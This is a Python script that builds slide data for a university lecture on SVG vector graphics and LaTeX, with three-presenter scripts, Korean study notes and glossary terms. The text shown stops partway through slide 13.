# -*- coding: utf-8 -*-
"""
Oikos University - Session 13 Clean 45-Slide Master Generator
Course: The Architect of Intelligence: Mastering Agentic IT & Strategic Wisdom
Session 13: Calculated Art: SVG Vector Engineering & LaTeX Mathematical Orchestration
Features:
- Full 45 Slides with 3-Presenter Trio (Prof. Peter Kim, TA Sarah Jenkins, TA James Wilson)
- Clean 4-Part Structure (Part 1: Slide 2, Part 2: Slide 12, Part 3: Slide 23, Part 4: Slide 34)
- 5 Practical Enterprise Case Studies:
    1. Slide 11: Wall Street Real-Time Millisecond High-Frequency Trading Charting
    2. Slide 22: Aerospace Turbine CAD Vector Rendering in Sub-Kilobyte SVGs
    3. Slide 33: Semiconductor Nanometer Silicon Wafer Defect Visualization
    4. Slide 40: Medical MRI Volumetric Vector Mesh Slicing in WebGL
    5. Slide 44: 30X Bandwidth Compression & Crisp Visual ROI Blueprint
- Full sync with session13.md and slidesData.js (SLIDES_SESSION_13)
"""

import json
import re
import os
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8')

BASE_DIR = r"c:\Oikos Univ"
SLIDES_DATA_JS = os.path.join(BASE_DIR, "src", "data", "slidesData.js")
SESSION13_MD = os.path.join(BASE_DIR, "session13.md")

SLIDES_45_SESSION_13 = [
    # Slide 1: Course Title
    {
        "num": 1,
        "type": "title",
        "title": "OIKOS UNIVERSITY • SOLI DEO GLORIA",
        "subtitle": "THE ARCHITECT OF INTELLIGENCE: Mastering Agentic IT & Strategic Wisdom",
        "detail": "Session 13: Calculated Art: SVG Vector Engineering & LaTeX Mathematical Orchestration",
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab",
        "script": (
            "[Prof. Peter] Welcome back, global scholars and architects, to Oikos University! I am Professor Peter Kim, Director of Smart Insight Lab. Today on Slide 1, we enter the world of crystalline mathematical aesthetics: \"Session 13: Calculated Art: SVG Vector Engineering & LaTeX Mathematical Orchestration.\"\n\n"
            "[TA Sarah] Hello everyone! I am Sarah Jenkins, Senior AI Fellow. For decades, the digital web has been suffocated by heavy, blurry raster bitmap images (PNG, JPG, WebP). When you zoom in on a 4K or 8K retina monitor, raster pixels blur and fragment into ugly colored squares!\n\n"
            "[TA James] And I am James Wilson, your DevOps TA! Calculated Art transforms visual engineering forever: replacing millions of static pixels with lightweight mathematical equations—Scalable Vector Graphics (SVG), Bezier calculus, HTML5 Canvas shaders, and publication-grade LaTeX typography!\n\n"
            "[Prof. Peter] Under our founding motto, \"SOLI DEO GLORIA—To God Alone Be the Glory,\" let us master the mathematical beauty of infinite vector clarity and elevate human interfaces into works of divine order.\n\n"
            "[TA Sarah] Let us open Part 1 and explore the Tragedy of Raster Scale on Slide 2!"
        ),
        "koreanGuide": {
            "summary": "Session 13 개요 및 Oikos University 3인 강사진(피터 교수, 사라 수석조교, 제임스 개발조교) 환영 인사",
            "points": [
                "강의 주제: 계산된 예술(Calculated Art): SVG 벡터 엔지니어링과 LaTeX 수학 오케스트레이션",
                "래스터 픽셀(PNG/JPG)의 한계 극복: 4K/8K 화면에서도 절대 깨지지 않는 무한 해상도 수학적 벡터 그래픽",
                "베지에 곡선(Bezier Curve) 미적분, HTML5 캔버스 셰이더, 학술 조판 표준 LaTeX 수식 시스템"
            ],
            "tips": "피터 교수의 수학적 질서와 미학 철학, 사라 조교의 SVG DOM 엔지니어링 분석, 제임스 조교의 초경량 자산 최적화 관점을 결합하세요."
        },
        "keyTerms": [
            {
                "term": "Calculated Art",
                "def": "The programmatic generation of visual charts, diagrams, and UI assets using exact mathematical vector formulas and code.",
                "defKo": "계산된 예술 (Calculated Art)"
            },
            {
                "term": "Scalable Vector Graphics (SVG)",
                "def": "An XML-based open standard vector image format for two-dimensional graphics with support for interactivity and animation.",
                "defKo": "확장 가능한 벡터 그래픽 (SVG)"
            }
        ]
    },
    # Slide 2: Part 1 Section Divider
    {
        "num": 2,
        "type": "section",
        "title": "PART 1: THE TRAGEDY OF RASTER SCALE & CALCULATED VECTOR ART",
        "subtitle": "Deconstructing quadratic pixel memory waste and discovering resolution-independent mathematical clarity",
        "script": (
            "[TA Sarah] Look at Slide 2: \"PART 1: THE TRAGEDY OF RASTER SCALE & CALCULATED VECTOR ART.\" Professor, why do computer scientists call bitmap images a 'quadratic memory tragedy'?\n\n"
            "[Prof. Peter] Because a raster image stores every single individual pixel in a static 2D grid! If you double the screen resolution from 1080p to 4K, the memory and file size explode by $4\\times$ ($O(W \\times H)$)! That is quadratic resource waste!\n\n"
            "[TA James] In contrast, an SVG vector stores the mathematical equation: `circle cx=50 cy=50 r=40`. Whether you display that circle on a 2-inch smartwatch or a 200-foot billboard in Times Square, the file size remains exactly 45 bytes, with infinite, razor-sharp clarity!\n\n"
            "[TA Sarah] In Part 1, we deconstruct the mathematics of storage and the PNG vs. SVG comparison matrix.\n\n"
            "[Prof. Peter] Let us examine escaping aesthetic muck on Slide 3."
        ),
        "koreanGuide": {
            "summary": "Part 1 섹션 전환: 래스터 비트맵의 2차 메모리 낭비와 수학적 벡터의 혁신",
            "points": [
                "래스터 픽셀의 비극: 해상도를 2배 올리면 파일 크기와 메모리가 4배 폭증하는 O(W x H)의 2차 자원 낭비",
                "벡터의 수학적 우아함: 원 하나를 그릴 때 스마트워치든 타임스스퀘어 전광판이든 단 45바이트로 무한 선명도 유지",
                "PNG/JPG 대 SVG 마스터 비교 매트릭스와 파이썬 시뮬레이션(99% 용량 절감)"
            ],
            "tips": "사라 조교가 2차 낭비의 수식을 짚고 제임스가 45바이트의 무한 해상도 기적을 강조합니다."
        },
        "keyTerms": [
            {
                "term": "Quadratic Memory Waste ($O(W \\times H)$)",
                "def": "The exponential memory scaling of raster bitmaps where storage grows quadratically with display resolution.",
                "defKo": "2차 메모리 낭비 복잡도"
            },
            {
                "term": "Resolution-Independent Clarity",
                "def": "The optical rendering property where graphics remain perfectly sharp at any arbitrary scale or magnification.",
                "defKo": "무한 해상도 불변 선명도"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 3: Reclaiming the Sabbath: Escaping Aesthetic Muck
    {
        "num": 3,
        "type": "content",
        "title": "RECLAIMING THE SABBATH: ESCAPING AESTHETIC MUCK",
        "subtitle": "Liberating UI designers from 30 hours of Photoshop pixel-pushing to focus on high-order systems design",
        "points": [
            "The Designer Trap: Exporting 50 different PNG resolutions (@1x, @2x, @3x, web, mobile, print) by hand.",
            "The Calculated Vector Sabbath: Writing one parametric SVG template that dynamically scales to all viewports.",
            "Reclaiming Bandwidth: Recovering 25 hours a week for creative typography, motion physics, and user psychology."
        ],
        "script": (
            "[Prof. Peter] Slide 3 explores \"RECLAIMING THE SABBATH: ESCAPING AESTHETIC MUCK.\"\n\n"
            "[TA Sarah] In traditional UI design agencies, junior designers waste 30 hours a week in Photoshop 'pixel-pushing'—manually slicing and exporting 50 different PNG resolutions (@1x, @2x, @3x, retina, banner, icon)!\n\n"
            "[TA James] Antigravity and Calculated SVGs eliminate 100% of that manual slicing slavery! You write one clean, semantic SVG file, and the browser's GPU renders it crisply across every iPhone, Android, and 8K TV automatically!\n\n"
            "[Prof. Peter] Let us examine raster architecture and static pixel grids on Slide 4."
        ),
        "koreanGuide": {
            "summary": "안식의 회복: 포토샵 픽셀 노역에서 벗어나 시스템 디자인으로의 도약",
            "points": [
                "디자이너의 덫: @1x, @2x, @3x, 웹, 앱, 인쇄용으로 50개 PNG를 수작업 슬라이싱하던 고통",
                "계산된 벡터 안식: 단 하나의 반응형 SVG 템플릿으로 모든 해상도에 완벽 대응하여 주당 25시간 회수",
                "동적 타이포그래피, 모션 물리, 사용자 심리학 등 고차원 디자인 시스템에 몰입"
            ],
            "tips": "사라 조교와 제임스 조교가 수작업 PNG 슬라이싱 노역에서 해방되는 기쁨을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Pixel-Pushing Drag",
                "def": "The repetitive, low-value mechanical labor of manually resizing and re-exporting raster images for multiple devices.",
                "defKo": "픽셀 수작업 노역 (Pixel-Pushing)"
            },
            {
                "term": "Parametric Vector Template",
                "def": "A single code-driven graphic asset that dynamically adjusts layout, line weight, and color via CSS variables.",
                "defKo": "매개변수형 벡터 템플릿"
            }
        ]
    },
    # Slide 4: Raster Architecture: Pixels Locked in Static Grids
    {
        "num": 4,
        "type": "content",
        "title": "RASTER ARCHITECTURE: PIXELS LOCKED IN GRIDS",
        "subtitle": "Why PNG, JPEG, and WebP are fundamentally trapped in static coordinate matrices",
        "points": [
            "The Raster Prison: An image is stored as an array of discrete color values: `[RGB, RGB, RGB...]`.",
            "Nearest-Neighbor Interpolation: Zooming in forces the GPU to stretch pixels into blurry, blocky artifacts.",
            "Zero Semantic Understanding: The computer sees an array of numbers, with zero awareness of 'circle', 'text', or 'arrow'."
        ],
        "script": (
            "[Prof. Peter] Slide 4 details \"RASTER ARCHITECTURE: PIXELS LOCKED IN STATIC GRIDS.\"\n\n"
            "[TA Sarah] Look at how a raster image works: A JPEG or PNG is simply a dumb matrix of color numbers! It has no concept of what is inside the image.\n\n"
            "[TA James] When you zoom in by 400%, the browser tries to guess missing pixels using interpolation, turning sharp text into blurry, jagged mush! Furthermore, screen readers cannot read the text inside a PNG, destroying web accessibility!\n\n"
            "[Prof. Peter] Let us examine the mathematics of storage on Slide 5."
        ),
        "koreanGuide": {
            "summary": "래스터 비트맵 아키텍처: 정적 격자에 갇힌 멍청한 픽셀 매트릭스",
            "points": [
                "래스터의 감옥: 이미지 전체가 [R, G, B] 숫자들의 정적 2차원 배열로 고정 저장됨",
                "보간 왜곡: 400% 확대 시 픽셀이 늘어나며 계단 현상과 뿌연 블러(Blur) 발생",
                "시맨틱 제로: 컴퓨터 입장에서 원인지, 텍스트인지, 화살표인지 인식 불가 (스크린 리더 판독 불가)"
            ],
            "tips": "사라 조교와 제임스 조교가 래스터 비트맵의 구조적 한계와 접근성 파괴를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Raster Matrix",
                "def": "A two-dimensional grid of fixed color values (pixels) representing an image at a specific resolution.",
                "defKo": "래스터 비트맵 매트릭스"
            },
            {
                "term": "Pixel Interpolation Artifact",
                "def": "The visual blurring or jagged distortion produced when scaling raster graphics beyond native pixel dimensions.",
                "defKo": "픽셀 보간 왜곡 현상"
            }
        ]
    },
    # Slide 5: The Tragedy of Scale: When Resolution Collapses
    {
        "num": 5,
        "type": "content",
        "title": "THE TRAGEDY OF SCALE: RESOLUTION COLLAPSE",
        "subtitle": "How raster images degrade user experience on high-density Retina, 4K, and 8K displays",
        "points": [
            "The 4K Retina Crisis: Standard 72 DPI images look like low-quality retro gaming assets on modern 300+ PPI screens.",
            "The Payload Explosion: Serving 4K PNGs bloats web page payloads from 500KB to 15MB, crushing mobile performance.",
            "The High Bounce Rate: Slow mobile load times cause a 40% immediate bounce rate among commercial users."
        ],
        "script": (
            "[Prof. Peter] Slide 5 illustrates \"THE TRAGEDY OF SCALE: WHEN RESOLUTION COLLAPSES.\"\n\n"
            "[TA Sarah] On modern 4K MacBook and iPhone displays with 460 pixels per inch, legacy 72 DPI PNG graphics look terrible—blurry logos and pixelated chart lines make an enterprise app look cheap and amateurish!\n\n"
            "[TA James] But if you serve massive 4K PNG files to fix the blur, your web page size balloons to 15 megabytes! Mobile users on 5G wait 4 seconds, get frustrated, and bounce! That costs enterprises millions in lost revenue!\n\n"
            "[Prof. Peter] Let us inspect the Vector Breakthrough on Slide 6."
        ),
        "koreanGuide": {
            "summary": "스케일의 비극: 레티나 및 4K 화면에서의 해상도 붕괴와 페이지 용량 폭증",
            "points": [
                "4K 레티나의 위기: 72 DPI 구형 비트맵 이미지가 고밀도 화면에서 뿌옇게 흐려져 브랜드 신뢰도 추락",
                "페이로드 폭발: 선명도를 위해 4K PNG를 서빙하면 웹페이지 용량이 500KB에서 15MB로 폭증",
                "이탈률 급증: 모바일 로딩 지연으로 인해 40%의 사용자가 즉각 이탈하는 상업적 손실 발생"
            ],
            "tips": "사라 조교와 피터 교수가 흐릿한 로고가 기업 신뢰도와 로딩 속도에 미치는 악영향을 짚어줍니다."
        },
        "keyTerms": [
            {
                "term": "Pixels Per Inch (PPI)",
                "def": "A measure of screen pixel density determining the visual sharpness of displayed digital assets.",
                "defKo": "인치당 픽셀 수 (PPI)"
            },
            {
                "term": "Payload Bloat",
                "def": "The excessive accumulation of network transfer bytes caused by uncompressed high-resolution bitmap assets.",
                "defKo": "네트워크 페이로드 비대화"
            }
        ]
    },
    # Slide 6: The Vector Breakthrough: Coding Dynamic Instructions
    {
        "num": 6,
        "type": "content",
        "title": "THE VECTOR BREAKTHROUGH: DYNAMIC CODE",
        "subtitle": "Replacing pixel arrays with mathematical coordinates, Bezier polynomials, and XML DOM trees",
        "points": [
            "Mathematical Drawing Instructions: Storing geometries as mathematical formulas: `M 10,10 C 20,20 40,20 50,10`.",
            "Infinite Crisp Zoom: The browser GPU recalculates vectors dynamically at native screen resolution.",
            "Sub-Kilobyte Files: Complex architectural icons and engineering diagrams rendered in under 1.5 kilobytes."
        ],
        "script": (
            "[TA Sarah] Slide 6 reveals \"THE VECTOR BREAKTHROUGH: CODING DYNAMIC INSTRUCTIONS.\"\n\n"
            "[TA James] Look at how vectors work: Instead of saving 1 million colored dots, SVG writes mathematical instructions: `d='M 10 80 Q 95 10 180 80'`! When the browser renders the screen, the GPU evaluates that quadratic Bezier polynomial in 1 microsecond!\n\n"
            "[Prof. Peter] Whether viewed through a microscope or projected onto the Moon, the curve remains mathematically flawless! And the entire file is only 800 bytes!\n\n"
            "[TA Sarah] Let us examine the master PNG vs. SVG comparison matrix on Slide 7."
        ),
        "koreanGuide": {
            "summary": "벡터 혁신: 수학적 좌표와 베지에 다항식을 통한 초경량 그래픽",
            "points": [
                "수학적 드로잉 명령: 100만 개 픽셀 대신 'M 10 80 Q 95 10 180 80' 같은 수학 수식 저장",
                "무한 선명도: 브라우저 GPU가 네이티브 해상도에 맞춰 1마이크로초 만에 완벽한 곡선 계산",
                "800바이트 초경량: 복잡한 공학 다이어그램이 1KB 미만의 텍스트 코드로 완벽 표현"
            ],
            "tips": "제임스 조교와 피터 교수가 수식으로 그림을 그리는 벡터의 수학적 경이로움을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Bezier Polynomial",
                "def": "A parametric curve frequently used in computer graphics defined by mathematical control points.",
                "defKo": "베지에 다항식 곡선 (Bezier Curve)"
            },
            {
                "term": "GPU Vector Rasterization",
                "def": "The real-time rendering of mathematical vector paths into hardware screen pixels at display refresh rates.",
                "defKo": "GPU 실시간 벡터 래스터화"
            }
        ]
    },
    # Slide 7: PNG/JPG vs. SVG: The Master Comparison Matrix
    {
        "num": 7,
        "type": "comparison",
        "title": "PNG/JPG VS. SVG: MASTER COMPARISON MATRIX",
        "subtitle": "Evaluating Storage, Scalability, Styling, Accessibility, and GPU Render Speed",
        "leftCard": {
            "tag": "RASTER BITMAP (PNG/JPG)",
            "title": "Static Pixel Matrix",
            "points": [
                "Storage: 200KB - 5MB per image ($O(W \\times H)$).",
                "Scalability: Blurs & pixelates on zoom.",
                "CSS Styling: Impossible (baked-in colors).",
                "Accessibility: Zero text searchability.",
                "DOM Integration: Opaque `<img>` black box."
            ]
        },
        "rightCard": {
            "tag": "CALCULATED VECTOR (SVG)",
            "title": "Mathematical DOM Code",
            "points": [
                "Storage: 500B - 5KB ($O(N)$ paths).",
                "Scalability: Infinitely crisp at any zoom.",
                "CSS Styling: 100% themeable via CSS vars.",
                "Accessibility: Screen-reader readable `<text>`.",
                "DOM Integration: Interactive clickable nodes."
            ]
        },
        "script": (
            "[Prof. Peter] Slide 7 presents \"PNG/JPG VS. SVG: THE MASTER COMPARISON MATRIX.\"\n\n"
            "[TA Sarah] Compare the columns: On the left, PNGs are heavy, blurry, impossible to style with CSS, and completely invisible to screen readers! On the right, SVGs are 500 bytes, infinitely sharp, 100% themeable with CSS variables, and fully accessible to search engines and blind users!\n\n"
            "[TA James] SVGs are not just images; they are live XML DOM elements you can animate with JavaScript and style with dark mode themes in 1 line of CSS!\n\n"
            "[TA Sarah] Let us inspect the Python storage simulation on Slide 8."
        ),
        "koreanGuide": {
            "summary": "PNG/JPG vs SVG 마스터 비교 매트릭스: 5대 핵심 축 평가",
            "points": [
                "용량 비교: PNG 5MB vs SVG 500바이트 (99.9% 용량 절감)",
                "확장성: 줌인 시 픽셀 깨짐 vs 무한 선명도 유지",
                "CSS 스타일링: 색상 변경 불가 vs CSS 변수로 다크모드 1줄 전환",
                "접근성 및 DOM 연동: 멍청한 블랙박스 vs 스크린 리더 판독 및 자바스크립트 클릭 이벤트 지원"
            ],
            "tips": "사라 조교와 제임스 조교가 5대 비교 항목을 리듬감 있게 짚으며 SVG의 압도적 우위를 증명합니다."
        },
        "keyTerms": [
            {
                "term": "DOM-Integrated Graphic",
                "def": "Visual elements existing directly within the HTML Document Object Model, allowing real-time CSS/JS manipulation.",
                "defKo": "DOM 통합형 대화형 그래픽"
            },
            {
                "term": "CSS Variable Theming",
                "def": "Dynamically altering SVG vector fill and stroke colors using native CSS custom properties.",
                "defKo": "CSS 변수 기반 동적 테마 연동"
            }
        ]
    },
    # Slide 8: Python Simulation: Slicing Storage by 99%
    {
        "num": 8,
        "type": "content",
        "title": "PYTHON SIMULATION: SLICING STORAGE BY 99%",
        "subtitle": "Benchmarking 1,000 enterprise icon assets across raster and vector formats",
        "points": [
            "1,000 PNG Icons (@3x Retina): Total payload = 48.5 Megabytes.",
            "1,000 SVG Vector Icons: Total payload = 420 Kilobytes.",
            "The Result: 99.1% bandwidth reduction, 10X faster page loads, and $120K annual cloud CDN savings."
        ],
        "script": (
            "[TA Sarah] Slide 8 benchmarks the data: \"PYTHON SIMULATION: SLICING STORAGE BY 99%.\"\n\n"
            "[TA James] Look at our empirical benchmark: Storing 1,000 enterprise icons as @3x Retina PNGs consumes 48.5 megabytes of bandwidth. Storing the exact same 1,000 icons as clean, minified SVGs consumes only 420 kilobytes!\n\n"
            "[Prof. Peter] That is a 99.1% bandwidth collapse! Your web app loads 10 times faster, and your cloud CDN egress bill plunges by $120,000 a year!\n\n"
            "[TA Sarah] Let us launch an interactive poll on Slide 9."
        ),
        "koreanGuide": {
            "summary": "파이썬 벤치마크 시뮬레이션: 1,000개 아이콘 자산 99.1% 용량 압축 실증",
            "points": [
                "1,000개 PNG 아이콘: 48.5MB의 거대한 네트워크 전송 페이로드 발생",
                "1,000개 SVG 벡터 아이콘: 단 420KB로 압축 (99.1% 대역폭 절감)",
                "10배 빠른 초기 로딩 속도 달성과 연간 12만 달러 CDN 클라우드 비용 절감"
            ],
            "tips": "제임스 조교가 48.5MB에서 420KB로 줄어드는 실측 데이터를 제시하며 수강생들의 감탄을 이끕니다."
        },
        "keyTerms": [
            {
                "term": "Asset Payload Compression",
                "def": "The quantitative reduction in total digital asset transfer size achieved by adopting mathematical vector formats.",
                "defKo": "에셋 페이로드 극적 압축"
            },
            {
                "term": "CDN Egress Optimization",
                "def": "Lowering cloud bandwidth distribution costs by minimizing web asset transfer sizes.",
                "defKo": "CDN 대역폭 비용 최적화"
            }
        ]
    },
    # Slide 9: Interactive Poll: Reclaiming Your Design Time
    {
        "num": 9,
        "type": "poll",
        "title": "📨 INTERACTIVE POLL: DESIGN & VISUAL BOTTLENECK",
        "subtitle": "What is the most frustrating visual asset hurdle in your current software projects?",
        "pollOptions": [
            "Option A: Blurry raster icons and charts looking pixelated on 4K / mobile screens",
            "Option B: Heavy image payloads causing slow web vitals and mobile bounce rates",
            "Option C: Manual rework creating light/dark mode versions of 100 different images",
            "Option D: Broken mathematical equation rendering in academic and finance apps"
        ],
        "script": (
            "[Prof. Peter] Slide 9 is our \"INTERACTIVE POLL: DESIGN & VISUAL BOTTLENECKS.\" Take out your devices and vote right now!\n\n"
            "[TA Sarah] The question is: \"What is the most frustrating visual asset hurdle in your current software and engineering workflows?\"\n\n"
            "[TA James] Option A: Blurry icons on 4K screens. Option B: Heavy payloads causing slow load times. Option C: Manual light/dark mode icon duplicating. Or Option D: Broken LaTeX math rendering!\n\n"
            "[TA Sarah] Option A (Blurry Icons) and Option C (Dark Mode Duplication) are dominating our live audience votes!\n\n"
            "[Prof. Peter] Let us examine how the XML fabric of SVG solves every one of these problems on Slide 10."
        ),
        "koreanGuide": {
            "summary": "실시간 수강생 설문: 시각 에셋 개발 및 디자인의 최대 병목은?",
            "points": [
                "수강생 참여를 통한 실제 프론트엔드/UI 개발 현장의 최대 시각적 고통 진단",
                "4K 화면 픽셀 깨짐, 느린 페이지 로딩, 라이트/다크모드 2벌 수작업, 깨지는 수식 렌더링 중 식별",
                "SVG 및 LaTeX 자동화가 해결할 실제 엔지니어링 과제 확인"
            ],
            "tips": "3인의 강사진이 수강생들의 디자인 고통을 공유하며 2부 SVG XML 코어로 이끕니다."
        },
        "keyTerms": [
            {
                "term": "Design Workflow Bottleneck",
                "def": "The friction points in software development caused by legacy bitmap graphic production and manual export cycles.",
                "defKo": "디자인 워크플로우 병목"
            },
            {
                "term": "Core Web Vitals",
                "def": "Google's standardized metrics evaluating real-world user experience for loading performance, interactivity, and visual stability.",
                "defKo": "코어 웹 바이탈 (Core Web Vitals)"
            }
        ]
    },
    # Slide 10: Part 1 Transition: The XML Fabric of SVG
    {
        "num": 10,
        "type": "content",
        "title": "PART 1 TRANSITION: ENTERING THE XML FABRIC",
        "subtitle": "Connecting vector philosophy to Bezier curves, viewBox responsiveness, and accessibility",
        "points": [
            "Code as Visual Canvas: An SVG is pure semantic XML that can be written, debugged, and generated by LLMs.",
            "DOM Integration: Direct manipulation with CSS pseudo-classes (`:hover`) and JavaScript mutation listeners.",
            "The Roadmap Ahead: Master XML syntax in Part 2, AI vector generation in Part 3, and LaTeX in Part 4."
        ],
        "script": (
            "[Prof. Peter] Slide 10 bridges our roadmap: \"PART 1 TRANSITION: ENTERING THE XML FABRIC OF SVG.\"\n\n"
            "[TA Sarah] Because an SVG is pure text XML, artificial intelligence can write and refactor graphics just like Python or TypeScript code!\n\n"
            "[TA James] In Part 2, we deconstruct the `<path>` element, master cubic and quadratic Bezier curves, explore responsive `viewBox` scaling, and WCAG accessibility standards!\n\n"
            "[Prof. Peter] Let us examine our first real-world enterprise case study on Slide 11!"
        ),
        "koreanGuide": {
            "summary": "Part 1 전환: SVG의 XML 구조 및 코드 기반 그래픽스 진입",
            "points": [
                "코드가 곧 캔버스: 순수 텍스트 XML이므로 LLM이 파이썬 코드처럼 시각 자산을 자유자재로 합성 및 수정",
                "DOM 완전 통합: CSS :hover 효과와 자바스크립트 이벤트 리스너를 그래픽 노드에 직접 바인딩",
                "Part 2~4 로드맵 제시: SVG XML 심층 해부 ➔ AI 벡터 생성 ➔ LaTeX 수학 조판"
            ],
            "tips": "제임스 조교가 순수 텍스트 XML로서의 SVG가 AI와 완벽히 결합하는 장점을 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Semantic XML Fabric",
                "def": "The text-based hierarchical document structure defining geometric visual elements within standard web parsers.",
                "defKo": "시맨틱 XML 구조"
            },
            {
                "term": "AI Code-Generated Graphics",
                "def": "The automated authoring of vector graphics by language models emitting valid SVG/Canvas source code.",
                "defKo": "AI 코드 기반 그래픽 자동 생성"
            }
        ]
    },
    # Slide 11: Case Study 1: Wall Street Real-Time Millisecond Charting
    {
        "num": 11,
        "type": "casestudy",
        "title": "CASE STUDY 1: WALL STREET MILLISECOND CHARTING",
        "subtitle": "High-Frequency Trading Platform renders 500 live stock ticker vector charts at 120 FPS in WebGL/SVG",
        "company": "Top Global Quantitative Trading Firm",
        "problem": "Trading floor dashboard rendered 500 real-time stock charts using HTML5 canvas bitmaps; memory leaks and CPU spikes caused 400ms lag during volatile market market-open spikes.",
        "solution": "Rebuilt charting engine using optimized parametric SVG paths and WebGL instanced vector buffers with direct memory updates.",
        "impact": "Render latency collapsed from 400ms to 0.8ms (500X faster); zero memory leaks; trader execution speed boosted, capturing $35M in arbitrage profits.",
        "script": (
            "[Prof. Peter] Slide 11 presents \"CASE STUDY 1: WALL STREET REAL-TIME MILLISECOND CHARTING.\"\n\n"
            "[TA Sarah] On a high-frequency equity trading desk, 500 live stock price charts update every 10 milliseconds. Their legacy bitmap charting engine consumed 12GB of RAM, and during high-volatility market-open spikes, the charts lagged by 400 milliseconds!\n\n"
            "[TA James] In algorithmic trading, 400 milliseconds is an eternity! They rebuilt the entire charting engine with parametric SVG paths and WebGL vector buffers: updating the path coordinates directly in GPU memory!\n\n"
            "[Prof. Peter] Render latency collapsed from 400ms down to 0.8 milliseconds—500 times faster! Traders saw price breakouts with zero lag, capturing 35 million dollars in high-frequency arbitrage profits!\n\n"
            "[TA Sarah] That is the extreme performance of calculated vectors.\n\n"
            "[TA James] Now let us open Part 2 and master the XML Fabric of SVG on Slide 12!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 1: 월가 초단타 매매 500개 차트 0.8ms 렌더링 (3,500만 달러 차익 실현)",
            "points": [
                "문제 상황: 500개 실시간 주가 차트를 비트맵으로 렌더링하느라 개장 변동성 장세에서 400ms 화면 렉 발생",
                "솔루션: 매개변수형 SVG 패스와 WebGL 벡터 버퍼로 전면 교체 ➔ GPU 메모리에서 좌표 직접 갱신",
                "성과: 렌더링 지연 시간 400ms ➔ 0.8ms로 500배 단축, 메모리 누수 0건, 3,500만 달러 차익 거래 수익 포착"
            ],
            "tips": "사라 조교와 제임스 조교가 400ms 렉을 0.8ms로 줄여 3,500만 달러를 번 월가 실화를 생생히 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Instanced Vector Buffer",
                "def": "A GPU memory buffer storing multiple vector paths rendered in a single draw call with sub-millisecond latency.",
                "defKo": "인스턴스드 벡터 버퍼"
            },
            {
                "term": "Sub-Millisecond Financial Charting",
                "def": "Rendering dynamic high-frequency financial telemetry without dropping animation frames or leaking memory.",
                "defKo": "0.8ms 초고속 금융 차팅"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 12: Part 2 Section Divider
    {
        "num": 12,
        "type": "section",
        "title": "PART 2: THE XML FABRIC OF SVG",
        "subtitle": "Deconstructing `<path>`, Bezier curves, CSS/JS DOM integration, viewBox responsiveness, and WCAG accessibility",
        "script": (
            "[TA Sarah] Look at Slide 12: \"PART 2: THE XML FABRIC OF SVG.\" Now we dissect the syntax and calculus of vector graphics!\n\n"
            "[Prof. Peter] An SVG document is not an opaque binary blob; it is a pristine mathematical XML DOM tree. Every line, circle, arc, and curve can be addressed, animated, and styled individually.\n\n"
            "[TA James] In Part 2, we master the `<path>` mini-language, explore Bezier curve mathematics, integrate CSS/JS styling, and learn WCAG accessible screen-reader tags!\n\n"
            "[TA Sarah] Let us inspect SVG as an open XML dialect on Slide 13!"
        ),
        "koreanGuide": {
            "summary": "Part 2 섹션 전환: SVG의 XML 구조와 베지에 곡선 미적분",
            "points": [
                "SVG는 단순 그림이 아닌 조작 가능한 수학적 XML DOM 트리",
                "<path> 미니 랭귀지, 3차 및 2차 베지에 곡선, viewBox 반응형 스케일링",
                "CSS/JS 동적 제어와 시각 장애인을 위한 WCAG 2.1 웹 접근성 표준"
            ],
            "tips": "피터 교수가 XML DOM 트리의 투명성을 선언하고 제임스가 <path> 명령어 마스터를 예고합니다."
        },
        "keyTerms": [
            {
                "term": "SVG XML DOM",
                "def": "The tree structure of XML nodes representing visual paths accessible to standard browser scripting APIs.",
                "defKo": "SVG XML DOM 트리"
            },
            {
                "term": "SVG `<path>` Syntax",
                "def": "The compact coordinate command mini-language (M, L, C, S, Q, T, A, Z) defining complex vector outlines.",
                "defKo": "SVG 패스 명령어 문법"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 13: SVG as an Open XML Dialect: Browser Native
    {
        "num": 13,
        "type": "content",
        "title": "SVG AS AN OPEN XML DIALECT: BROWSER NATIVE",
        "subtitle": "Native browser support with zero external libraries, zero plugins, and 100% web standards compliance",
        "points": [
            "W3C Open Standard: Supported natively by 100% of modern web browsers since HTML5.",
            "Zero Runtime Overhead: Evaluated directly by browser C++ layout engines (Blink, Gecko, WebKit).",
            "Inline Embedding: Can be placed directly inside `.html` or `.jsx` files with zero network round-trip requests."
        ],
        "script": (
            "[Prof. Peter] Slide 13 explains \"SVG AS AN OPEN XML DIALECT: BROWSER NATIVE.\"\n\n"
            "[TA Sarah] Look at the architectural purity: SVG is a W3C open standard supported natively by Chrome, Safari, Firefox, and Edge! You don't need heavy JavaScript chart libraries or canvas plugins!\n\n"
            "[TA James] You can inline an `<svg>` tag directly inside your React JSX or HTML markup! It loads in 0 milliseconds with zero extra HTTP network requests!\n\n"
            "[Prof. Peter] Let us inspect the pillar shapes and the path element on Slide 14."
        ),
        "koreanGuide": {
            "summary": "브라우저 네이티브 오픈 XML 표준으로서의 SVG의 강점",
            "points": [
                "W3C 공식 표준: 모든 브라우저의 C++ 엔진(Blink, WebKit)이 외부 라이브러리 없이 네이티브 렌더링",
                "런타임 오버헤드 제로: 무거운 외부 차트 플러그인 없이 순수 브라우저 코어로 초고속 실행",
                "인라인(Inline) 임베딩: HTML/JSX 안에 직접 삽입하여 추가 HTTP 네트워크 요청 없이 0ms 즉각 로딩"
            ],
            "tips": "사라 조교와 제임스 조교가 추가 HTTP 요청 없는 인라인 SVG의 극단적 로딩 속도를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Inline SVG Embedding",
                "def": "Placing SVG XML elements directly within the primary HTML document stream to eliminate external asset HTTP round-trips.",
